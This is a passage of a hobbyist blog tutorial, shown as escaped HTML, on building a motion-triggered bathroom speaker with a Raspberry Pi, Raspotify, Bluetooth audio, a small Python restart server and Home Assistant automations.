&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# Uncomment to use a cache for downloaded audio files. Cache is disabled by
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# default. It&amp;amp;#39;s best to leave this as-is if you want to use it, since
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# permissions are properly set on the directory `&amp;#x2F;var&amp;#x2F;cache&amp;#x2F;raspotify&amp;amp;#39;.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;#CACHE_ARGS=&amp;amp;quot;--cache &amp;#x2F;var&amp;#x2F;cache&amp;#x2F;raspotify&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# By default, the volume normalization is enabled, add alternative volume
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# arguments here if you&amp;amp;#39;d like, but these should be fine.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;#VOLUME_ARGS=&amp;amp;quot;--enable-volume-normalisation --volume-ctrl linear --initial-volume=100&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# Backend could be set to pipe here, but it&amp;amp;#39;s for very advanced use cases of
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# librespot, so you shouldn&amp;amp;#39;t need to change this under normal circumstances.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;#BACKEND_ARGS=&amp;amp;quot;--backend alsa&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;h3 id=&amp;quot;installing-pi-btaudio&amp;quot;&amp;gt;Installing pi-btaudio&amp;lt;&amp;#x2F;h3&amp;gt;
&amp;lt;p&amp;gt;pi-btaudio is a suite of packages that allow your RPi to connect to UE Boom automatically, and make sure the connection stays active.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Start by going over the &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;bablokb&amp;#x2F;pi-btaudio#prerequisites&amp;quot;&amp;gt;prerequisites&amp;lt;&amp;#x2F;a&amp;gt;, make sure to write down the MAC address of your UE Boom. In order to connect to a UE Boom, you must press its Bluetooth pairing button for it to accept new connections.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Once you’re done, follow &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;bablokb&amp;#x2F;pi-btaudio#installation&amp;quot;&amp;gt;their installation steps&amp;lt;&amp;#x2F;a&amp;gt; to install the tools. Edit the configuration file in &amp;lt;code&amp;gt;&amp;#x2F;etc&amp;#x2F;asound.conf&amp;lt;&amp;#x2F;code&amp;gt; with the following content (&amp;lt;strong&amp;gt;make sure you replace &amp;lt;code&amp;gt;&amp;amp;lt;UE Boom Bluetooth MAC&amp;amp;gt;&amp;lt;&amp;#x2F;code&amp;gt; with the one found during prerequisites&amp;lt;&amp;#x2F;strong&amp;gt;):&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot;&amp;gt;&amp;lt;code&amp;gt;&amp;lt;span&amp;gt;pcm.!default &amp;amp;quot;bluealsa&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;ctl.!default &amp;amp;quot;bluealsa&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;defaults.bluealsa.interface &amp;amp;quot;hci0&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;defaults.bluealsa.device &amp;amp;quot;&amp;amp;lt;UE Boom Bluetooth MAC&amp;amp;gt;&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;defaults.bluealsa.profile &amp;amp;quot;a2dp&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;h3 id=&amp;quot;raspotify-watchdog-restarter&amp;quot;&amp;gt;Raspotify Watchdog Restarter&amp;lt;&amp;#x2F;h3&amp;gt;
&amp;lt;p&amp;gt;Providing credentials as options to Raspotify ensures Home Assistant will be able to connect and play music remotely. But after someone else uses Spotify Connect to cast music into Raspotify - it’s unable to reconnect using the credentials provided in the configuration file.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;To solve this, I wrote a small API server in Python to restart Raspotify once I want to turn it off (when motion sensor turns off).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Start by creating a &amp;lt;code&amp;gt;~&amp;#x2F;watchdog&amp;lt;&amp;#x2F;code&amp;gt; directory and placing the following content in &amp;lt;code&amp;gt;~&amp;#x2F;watchdog&amp;#x2F;server.py&amp;lt;&amp;#x2F;code&amp;gt; (&amp;lt;strong&amp;gt;replace &amp;lt;code&amp;gt;&amp;amp;lt;Secret Restart Password QueryString&amp;amp;gt;&amp;lt;&amp;#x2F;code&amp;gt; with some long string that should be kept secret&amp;lt;&amp;#x2F;strong&amp;gt;):&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;python&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-python &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-python&amp;quot; data-lang=&amp;quot;python&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;os
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;from &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;http.server &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;HTTPServer, BaseHTTPRequestHandler
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;class &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;MyHandler&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;BaseHTTPRequestHandler&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;do_GET&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;self&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;self&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;.path &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;!= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;#x2F;?&amp;amp;lt;Secret Restart Password QueryString&amp;amp;gt;&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;self.send_response(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;401&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;self.end_headers()
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;self.wfile.write(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;bytes&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;Bye bye&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;utf-8&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;))
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;return
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# send 200 response
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;self.send_response(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;200&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# send response headers
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;self.end_headers()
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# send the body of the response
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;os.system(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;sudo systemctl restart raspotify.service&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;self.wfile.write(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;bytes&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;Restarted&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;utf-8&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;))
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;httpd &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;HTTPServer((&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;9876&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;), MyHandler)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;httpd.serve_forever()
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;Then create the file &amp;lt;code&amp;gt;&amp;#x2F;lib&amp;#x2F;systemd&amp;#x2F;system&amp;#x2F;restart_raspotify.service&amp;lt;&amp;#x2F;code&amp;gt; with the following content:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot;&amp;gt;&amp;lt;code&amp;gt;&amp;lt;span&amp;gt;[Unit]
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Description=Restart raspotify service
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;After=multi-user.target
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Conflicts=getty@tty1.service
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;[Service]
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Type=simple
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;ExecStart=&amp;#x2F;usr&amp;#x2F;bin&amp;#x2F;python3 &amp;#x2F;home&amp;#x2F;pi&amp;#x2F;watchdog&amp;#x2F;server.py
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;StandardInput=tty-force
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;[Install]
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;WantedBy=multi-user.target
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;To enable the newly created service, run:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;systemctl enable restart_raspotify.service
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;systemctl start restart_raspotify.service
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;h3 id=&amp;quot;spotcast-on-home-assistant&amp;quot;&amp;gt;Spotcast on Home Assistant&amp;lt;&amp;#x2F;h3&amp;gt;
&amp;lt;p&amp;gt;Spotcast enables Home Assistant to play music on Spotify Connect-enabled devices, like our Raspotify system. Follow the &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;fondberg&amp;#x2F;spotcast#installation&amp;quot;&amp;gt;installation steps&amp;lt;&amp;#x2F;a&amp;gt; to install on your Home Assistant instance. After installing, you need to configure Home Assistant to authenticate using your Spotify Premium account by following the &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;fondberg&amp;#x2F;spotcast#configuration&amp;quot;&amp;gt;configuration steps&amp;lt;&amp;#x2F;a&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;After restarting Home Assistant, you’ll be able to use Spotcast to play music on your speaker through Raspotify by calling this Home Assistant service (&amp;lt;strong&amp;gt;replace &amp;lt;code&amp;gt;&amp;amp;lt;Speaker Name&amp;amp;gt;&amp;lt;&amp;#x2F;code&amp;gt; with what you specified in &amp;lt;code&amp;gt;&amp;#x2F;etc&amp;#x2F;default&amp;#x2F;raspotify&amp;lt;&amp;#x2F;code&amp;gt;, and &amp;lt;code&amp;gt;&amp;amp;lt;Spotify Playlist URI&amp;amp;gt;&amp;lt;&amp;#x2F;code&amp;gt; with the Spotify-formatted URI such as &amp;lt;code&amp;gt;spotify:album:2PPfl28ysMbOkl2DBJ5Dr4&amp;lt;&amp;#x2F;code&amp;gt; - a good rainforest nature album&amp;lt;&amp;#x2F;strong&amp;gt;):&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;yaml&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-yaml &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-yaml&amp;quot; data-lang=&amp;quot;yaml&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;data&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;device_name&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;amp;lt;Speaker Name&amp;amp;gt;&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;random_song&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;true
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;uri&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;amp;lt;Spotify Playlist URI&amp;amp;gt;&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;start_volume&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;15
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;force_playback&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;true
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;service&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;spotcast.start
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;h3 id=&amp;quot;raspotify-restart-via-home-assistant&amp;quot;&amp;gt;Raspotify Restart via Home Assistant&amp;lt;&amp;#x2F;h3&amp;gt;
&amp;lt;p&amp;gt;Edit Home Assistant’s &amp;lt;code&amp;gt;configuration.yaml&amp;lt;&amp;#x2F;code&amp;gt; file (by &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.home-assistant.io&amp;#x2F;getting-started&amp;#x2F;configuration&amp;#x2F;&amp;quot;&amp;gt;installing the File Editor&amp;lt;&amp;#x2F;a&amp;gt; or by any other method) and insert the following to the configuration (&amp;lt;strong&amp;gt;replace &amp;amp;lt;Secret Restart Password QueryString&amp;amp;gt; with what you chose in &amp;lt;code&amp;gt;~&amp;#x2F;watchdog&amp;#x2F;server.py&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;strong&amp;gt;):&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;yaml&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-yaml &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-yaml&amp;quot; data-lang=&amp;quot;yaml&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;rest_command&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;restart_raspotify&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;url&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;http:&amp;#x2F;&amp;#x2F;&amp;amp;lt;Raspberry Pi IP&amp;amp;gt;:9876&amp;#x2F;?&amp;amp;lt;Secret Restart Password QueryString&amp;amp;gt;&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;After another Home Assistant restart, you’ll be able to invoke the following service to restart Raspotify and make it re-authenticate using the configured credentials:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;yaml&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-yaml &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-yaml&amp;quot; data-lang=&amp;quot;yaml&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;service&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;rest_command.restart_raspotify
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;h3 id=&amp;quot;connecting-it-all-together-in-home-assistant&amp;quot;&amp;gt;Connecting It All Together in Home Assistant&amp;lt;&amp;#x2F;h3&amp;gt;
&amp;lt;p&amp;gt;I configured an automation to trigger when the motion sensor is activated - it will play the rainforest nature album (&amp;lt;code&amp;gt;spotify:album:2PPfl28ysMbOkl2DBJ5Dr4&amp;lt;&amp;#x2F;code&amp;gt;). When the motion sensor is deactivated - it runs restart_raspotify to reset Raspotify to the configured credentials and be ready for the next person to walk in.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;If anyone wants the full Home Assistant setup, write a comment and I’ll upload that as well.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h3 id=&amp;quot;adding-airplay-support&amp;quot;&amp;gt;Adding AirPlay Support&amp;lt;&amp;#x2F;h3&amp;gt;
&amp;lt;p&amp;gt;Follow the instructions in the &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;lewin.co.il&amp;#x2F;bathroom-smart-speaker-part-2-airplay-to-bluetooth-speaker-via-raspberry-pi&amp;#x2F;&amp;quot;&amp;gt;follow-up post&amp;lt;&amp;#x2F;a&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;bonus-turning-ue-boom-on-via-raspberry-pi&amp;quot;&amp;gt;Bonus - Turning UE Boom On via Raspberry Pi&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;UE Boom is listening for Bluetooth commands even when turned off. You can use your phone (if paired with the speaker) to turn the speaker on remotely. You can do the same with Raspberry Pi after it’s connected. To do so, first install NodeJS (I chose version 14.15.4 while writing this, there’s probably a newer version available when you’re reading this). There’s no official NodeJS release for Raspberry Pi Zero W, but this unofficial installation works great for me:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;#!&amp;#x2F;bin&amp;#x2F;bash
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;export &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;NODE_VER&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;14.15.4
